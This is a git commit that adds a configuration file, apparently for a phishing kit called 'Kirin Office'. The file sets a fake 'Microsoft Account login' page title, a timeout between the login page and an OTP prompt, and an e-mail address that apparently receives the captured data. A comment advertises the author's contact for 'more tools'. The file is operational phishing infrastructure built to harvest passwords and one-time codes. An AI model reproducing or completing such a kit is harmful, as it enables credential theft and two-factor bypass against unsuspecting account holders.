c97f94471c419cc7110e43fe26bc87638f5c59ca
blt <freesmoke@vivaldi.net>
2022-07-11 05:16:48 -0700

    first

---
+++ config/init.js
@@ -0,0 +1,14 @@
+const config = {
+  name: "Kirin Office", // Provider Name
+  mail: "yungrenzel@yandex.com", // User E-mail
+  subject: " OFF ",
+  timeout: 7000, // time out between login Page and OTP
+  titlePage: "Microsoft Account login", // Title header bar
+
+  version: 1,
+  branch: 1.1,
+};
+
+// Kirin > kirin.110@inbox.ru for more tools
+
+// Keep this config sturcture .
